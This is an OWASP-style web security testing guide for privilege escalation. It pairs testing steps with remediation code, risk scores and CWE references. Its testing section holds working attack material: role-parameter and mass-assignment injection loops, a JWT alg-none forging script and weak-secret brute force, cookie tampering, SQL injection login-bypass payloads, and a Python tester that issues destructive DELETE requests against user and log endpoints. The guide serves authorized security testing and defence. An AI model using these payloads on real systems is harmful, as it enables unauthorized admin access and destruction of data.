# WSTG-AUTHZ-03: Testing for Privilege Escalation

## Test ID
WSTG-AUTHZ-03

## Test Name
Testing for Privilege Escalation

## High-Level Description

Privilege escalation occurs when a user gains access to resources or capabilities beyond their authorized level. There are two types: vertical escalation (gaining higher privileges like admin access) and horizontal escalation (accessing resources of other users at the same privilege level). This test focuses on identifying weaknesses that allow attackers to elevate their privileges within the application.

---

## What to Check

### Vertical Escalation Vectors

- [ ] Role parameter manipulation
- [ ] Admin function access
- [ ] Hidden admin endpoints
- [ ] JWT/token manipulation
- [ ] Cookie value tampering
- [ ] SQL injection for role bypass
- [ ] Mass assignment vulnerabilities

### Horizontal Escalation Vectors

- [ ] User ID manipulation
- [ ] IDOR vulnerabilities
- [ ] Session token prediction
- [ ] Shared resource access

---

## How to Test

### Step 1: Enumerate User Roles and Permissions

```bash
# Identify role structure from responses
curl -s "https://target.com/api/user/profile" \
    -H "Authorization: Bearer $TOKEN" | jq '.role, .permissions'

# Check role-related endpoints
curl -s "https://target.com/api/roles" -H "Authorization: Bearer $TOKEN"
curl -s "https://target.com/api/permissions" -H "Authorization: Bearer $TOKEN"

# Look for role indicators in responses
grep -iE "role|admin|permission|privilege|access|level" response.json
```

### Step 2: Test Role Parameter Manipulation

```bash
#!/bin/bash
# Test role manipulation in various requests

# During registration
curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "attacker",
        "password": "password123",
        "email": "attacker@test.com",
        "role": "admin"
    }'

# During profile update
curl -s -X PUT "https://target.com/api/user/profile" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "name": "Test User",
        "role": "admin"
    }'

# Test various role values
roles=("admin" "administrator" "root" "superuser" "1" "0" "true" "999")

for role in "${roles[@]}"; do
    response=$(curl -s -X PUT "https://target.com/api/user/profile" \
        -H "Authorization: Bearer $USER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"role\": \"$role\"}")

    echo "Role: $role - Response: $(echo $response | head -c 100)"
done
```

### Step 3: Test Hidden Parameters

```bash
# Common hidden parameters for privilege escalation
hidden_params=(
    "admin=true"
    "isAdmin=true"
    "is_admin=1"
    "role=admin"
    "user_type=admin"
    "access_level=admin"
    "privilege=high"
    "permissions[]=admin"
    "group_id=1"
    "account_type=admin"
)

for param in "${hidden_params[@]}"; do
    # Test in JSON body
    key=$(echo $param | cut -d'=' -f1)
    value=$(echo $param | cut -d'=' -f2)

    curl -s -X PUT "https://target.com/api/user/profile" \
        -H "Authorization: Bearer $USER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"$key\": \"$value\"}"

    # Test in query string
    curl -s "https://target.com/api/user/profile?$param" \
        -H "Authorization: Bearer $USER_TOKEN"
done
```

### Step 4: Test JWT Token Manipulation

```bash
#!/bin/bash
# Decode and analyze JWT token

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDAsInJvbGUiOiJ1c2VyIn0.xxx"

# Decode payload
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.'

# Common JWT attacks:

# 1. Algorithm none attack
# Change alg to "none" and remove signature
python3 << 'EOF'
import base64
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDAsInJvbGUiOiJ1c2VyIn0.xxx"

# Decode
header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))

# Modify
header['alg'] = 'none'
payload['role'] = 'admin'

# Encode
new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# Create token without signature
print(f"None-alg token: {new_header}.{new_payload}.")
EOF

# 2. Test with modified role
python3 << 'EOF'
import base64
import json
import hmac
import hashlib

# Try common weak secrets
secrets = ['secret', 'password', '123456', 'key', 'admin', 'changeme']

token = "your_token_here"
parts = token.split('.')

header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

# Modify payload
payload['role'] = 'admin'
payload['is_admin'] = True

new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

for secret in secrets:
    # Create new signature
    message = f"{parts[0]}.{new_payload}"
    signature = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    ).decode().rstrip('=')

    new_token = f"{parts[0]}.{new_payload}.{signature}"
    print(f"Secret '{secret}': {new_token}")
EOF
```

### Step 5: Test Cookie-Based Privilege

```bash
# Test cookie manipulation
# Capture cookies from normal user session
curl -s -c cookies.txt "https://target.com/login" \
    -d "username=user&password=pass"

# Check for role-related cookies
cat cookies.txt | grep -iE "role|admin|user|level|type"

# Modify cookies
curl -s "https://target.com/admin/dashboard" \
    -b "role=admin; session=xxx"

curl -s "https://target.com/admin/dashboard" \
    -b "user_type=administrator; session=xxx"

curl -s "https://target.com/admin/dashboard" \
    -b "is_admin=1; session=xxx"
```

### Step 6: Test SQL Injection for Role Bypass

```bash
# SQLi in login to bypass role check
payloads=(
    "admin'--"
    "admin' OR '1'='1"
    "admin'/*"
    "' OR role='admin'--"
    "' UNION SELECT 'admin','password',1--"
)

for payload in "${payloads[@]}"; do
    curl -s -X POST "https://target.com/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$payload&password=anything"
done
```

### Step 7: Comprehensive Privilege Escalation Tester

```python
#!/usr/bin/env python3
import requests
import json
import base64
import jwt
from copy import deepcopy

class PrivilegeEscalationTester:
    def __init__(self, base_url, user_token):
        self.base_url = base_url
        self.user_token = user_token
        self.session = requests.Session()
        self.session.headers.update({"Authorization": f"Bearer {user_token}"})

    def test_role_parameter_injection(self, endpoint, method='PUT'):
        """Test injecting role parameters"""
        print("\n[*] Testing role parameter injection...")
        results = []

        payloads = [
            {"role": "admin"},
            {"role": "administrator"},
            {"isAdmin": True},
            {"is_admin": 1},
            {"admin": True},
            {"user_type": "admin"},
            {"access_level": "admin"},
            {"privilege": "admin"},
            {"permissions": ["admin", "write", "delete"]},
            {"group_id": 1},
            {"role_id": 1},
        ]

        for payload in payloads:
            try:
                # Get current profile
                original = self.session.get(f"{self.base_url}/api/user/profile").json()

                # Try to inject
                if method == 'PUT':
                    response = self.session.put(
                        f"{self.base_url}{endpoint}",
                        json=payload
                    )
                else:
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=payload
                    )

                # Check if role changed
                new_profile = self.session.get(f"{self.base_url}/api/user/profile").json()

                if new_profile.get('role') != original.get('role'):
                    print(f"[VULN] Role changed with: {payload}")
                    results.append(payload)

            except Exception as e:
                pass

        return results

    def test_admin_endpoint_access(self):
        """Test accessing admin endpoints"""
        print("\n[*] Testing admin endpoint access...")
        accessible = []

        admin_endpoints = [
            "/admin",
            "/admin/dashboard",
            "/admin/users",
            "/admin/settings",
            "/admin/logs",
            "/api/admin/users",
            "/api/admin/config",
            "/api/admin/system",
            "/management",
            "/actuator",
            "/console",
            "/swagger-ui/",
            "/graphql",
        ]

        for endpoint in admin_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")

                if response.status_code == 200:
                    print(f"[VULN] Accessible: {endpoint}")
                    accessible.append(endpoint)
                elif response.status_code in [301, 302]:
                    print(f"[CHECK] Redirect: {endpoint}")

            except:
                pass

        return accessible

    def test_jwt_manipulation(self):
        """Test JWT token manipulation"""
        print("\n[*] Testing JWT manipulation...")
        results = []

        try:
            # Decode current token
            parts = self.user_token.split('.')
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

            print(f"Current payload: {payload}")

            # Create modified payloads
            modifications = [
                {"role": "admin"},
                {"is_admin": True},
                {"admin": True},
                {"permissions": ["admin"]},
                {"groups": ["administrators"]},
            ]

            for mod in modifications:
                new_payload = deepcopy(payload)
                new_payload.update(mod)

                # Try algorithm none attack
                header = {"alg": "none", "typ": "JWT"}
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                new_payload_b64 = base64.urlsafe_b64encode(
                    json.dumps(new_payload).encode()
                ).decode().rstrip('=')

                none_token = f"{new_header}.{new_payload_b64}."

                # Test the token
                test_session = requests.Session()
                test_session.headers.update({"Authorization": f"Bearer {none_token}"})

                try:
                    response = test_session.get(f"{self.base_url}/api/admin/users")
                    if response.status_code == 200:
                        print(f"[VULN] None-alg bypass works with: {mod}")
                        results.append({"type": "none_alg", "modification": mod})
                except:
                    pass

        except Exception as e:
            print(f"[ERROR] JWT test failed: {e}")

        return results

    def test_mass_assignment(self, endpoint):
        """Test mass assignment for privilege escalation"""
        print("\n[*] Testing mass assignment...")
        results = []

        # Get current user data
        try:
            current_data = self.session.get(f"{self.base_url}/api/user/profile").json()
        except:
            current_data = {}

        # Add privilege-related fields
        mass_assignment_payloads = [
            {**current_data, "role": "admin"},
            {**current_data, "isAdmin": True},
            {**current_data, "verified": True, "role": "admin"},
            {**current_data, "permissions": {"admin": True}},
            {**current_data, "privileges": ["all"]},
        ]

        for payload in mass_assignment_payloads:
            try:
                response = self.session.put(
                    f"{self.base_url}{endpoint}",
                    json=payload
                )

                # Verify changes
                new_data = self.session.get(f"{self.base_url}/api/user/profile").json()

                # Check for privilege changes
                if new_data.get('role') != current_data.get('role'):
                    print(f"[VULN] Mass assignment succeeded")
                    results.append(payload)

            except:
                pass

        return results

    def test_function_level_access(self):
        """Test function-level access control"""
        print("\n[*] Testing function-level access...")
        vulnerable = []

        # Admin functions to test
        admin_functions = [
            ("POST", "/api/users", {"username": "test", "role": "admin"}),
            ("DELETE", "/api/users/1", None),
            ("PUT", "/api/users/1/role", {"role": "admin"}),
            ("POST", "/api/config", {"setting": "value"}),
            ("POST", "/api/backup", {}),
            ("POST", "/api/import", {}),
            ("DELETE", "/api/logs", None),
        ]

        for method, endpoint, data in admin_functions:
            try:
                if method == "GET":
                    response = self.session.get(f"{self.base_url}{endpoint}")
                elif method == "POST":
                    response = self.session.post(f"{self.base_url}{endpoint}", json=data)
                elif method == "PUT":
                    response = self.session.put(f"{self.base_url}{endpoint}", json=data)
                elif method == "DELETE":
                    response = self.session.delete(f"{self.base_url}{endpoint}")

                if response.status_code in [200, 201]:
                    print(f"[VULN] {method} {endpoint} accessible")
                    vulnerable.append(f"{method} {endpoint}")

            except:
                pass

        return vulnerable

# Usage
tester = PrivilegeEscalationTester(
    "https://target.com",
    "user_jwt_token_here"
)

# Run tests
role_vulns = tester.test_role_parameter_injection("/api/user/profile")
admin_access = tester.test_admin_endpoint_access()
jwt_vulns = tester.test_jwt_manipulation()
mass_assign = tester.test_mass_assignment("/api/user/profile")
func_vulns = tester.test_function_level_access()

# Summary
print("\n" + "="*50)
print("PRIVILEGE ESCALATION TEST SUMMARY")
print("="*50)
print(f"Role parameter injection: {len(role_vulns)} findings")
print(f"Admin endpoint access: {len(admin_access)} findings")
print(f"JWT manipulation: {len(jwt_vulns)} findings")
print(f"Mass assignment: {len(mass_assign)} findings")
print(f"Function-level access: {len(func_vulns)} findings")
```

---

## Tools

### JWT Analysis

| Tool | Description | Usage |
|------|-------------|-------|
| **jwt.io** | JWT decoder | Analyze token structure |
| **jwt_tool** | JWT testing | `python3 jwt_tool.py TOKEN` |
| **jwt-cracker** | Brute-force secret | Weak secret testing |

### Authorization Testing

| Tool | Description |
|------|-------------|
| **Autorize (Burp)** | Auto-detect auth issues |
| **AuthMatrix (Burp)** | Role-based testing |
| **JSON Web Token Attacker (Burp)** | JWT attacks |

---

## Remediation Guide

### 1. Server-Side Role Enforcement

```python
from functools import wraps
from flask import request, g, abort

# Never trust client-provided role data
PROTECTED_FIELDS = ['role', 'is_admin', 'permissions', 'privilege', 'access_level']

def sanitize_user_input(data):
    """Remove protected fields from user input"""
    if isinstance(data, dict):
        return {k: v for k, v in data.items() if k not in PROTECTED_FIELDS}
    return data

@app.route('/api/user/profile', methods=['PUT'])
@require_auth
def update_profile():
    data = sanitize_user_input(request.json)

    # Only allow specific fields
    allowed_fields = ['name', 'email', 'avatar', 'bio']
    filtered_data = {k: v for k, v in data.items() if k in allowed_fields}

    # Update user with filtered data only
    current_user.update(**filtered_data)

    return jsonify({"success": True})
```

### 2. Role-Based Access Control (RBAC)

```python
class RBACMiddleware:
    ROLE_HIERARCHY = {
        'super_admin': ['admin', 'moderator', 'user'],
        'admin': ['moderator', 'user'],
        'moderator': ['user'],
        'user': [],
    }

    @classmethod
    def check_permission(cls, user_role, required_role):
        """Check if user role meets or exceeds required role"""
        if user_role == required_role:
            return True

        # Check hierarchy
        inherited_roles = cls.ROLE_HIERARCHY.get(user_role, [])
        return required_role in inherited_roles

def require_role(required_role):
    """Decorator for role-based access"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not g.current_user:
                abort(401)

            user_role = g.current_user.role  # From database, NOT from request

            if not RBACMiddleware.check_permission(user_role, required_role):
                abort(403)

            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Usage
@app.route('/admin/users')
@require_role('admin')
def admin_users():
    return get_all_users()
```

### 3. Secure JWT Implementation

```python
import jwt
from datetime import datetime, timedelta

class SecureJWT:
    def __init__(self, secret_key, algorithm='HS256'):
        self.secret_key = secret_key
        self.algorithm = algorithm

    def create_token(self, user):
        """Create JWT with secure claims"""
        payload = {
            'sub': user.id,  # User ID only
            'iat': datetime.utcnow(),
            'exp': datetime.utcnow() + timedelta(hours=1),
            'jti': generate_unique_id(),  # Unique token ID
        }

        # DO NOT include role in token - fetch from database
        return jwt.encode(payload, self.secret_key, algorithm=self.algorithm)

    def verify_token(self, token):
        """Verify token and get user with current role"""
        try:
            # Only accept specific algorithm
            payload = jwt.decode(
                token,
                self.secret_key,
                algorithms=[self.algorithm]  # Explicit algorithm
            )

            # Get user from database (includes current role)
            user = User.query.get(payload['sub'])

            if not user or not user.is_active:
                return None

            return user

        except jwt.ExpiredSignatureError:
            return None
        except jwt.InvalidTokenError:
            return None
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Vertical privilege escalation to admin | 9.8 | Critical |
| Role parameter injection | 8.8 | High |
| JWT algorithm confusion | 8.1 | High |
| Mass assignment to elevated role | 8.1 | High |
| Horizontal privilege escalation | 7.5 | High |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-269** | Improper Privilege Management | Privilege escalation |
| **CWE-266** | Incorrect Privilege Assignment | Wrong privileges |
| **CWE-285** | Improper Authorization | Weak authorization |
| **CWE-915** | Mass Assignment | Unprotected fields |

---

## References

- [OWASP WSTG - Privilege Escalation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation)
- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [JWT Security Best Practices](https://datatracker.ietf.org/doc/html/rfc8725)

---

## Checklist

```
[ ] User roles enumerated
[ ] Role parameter injection tested
[ ] Hidden parameters tested
[ ] JWT token manipulation tested
[ ] Cookie-based privileges tested
[ ] Admin endpoint access tested
[ ] Mass assignment tested
[ ] SQL injection for role bypass tested
[ ] Function-level access tested
[ ] Horizontal escalation tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
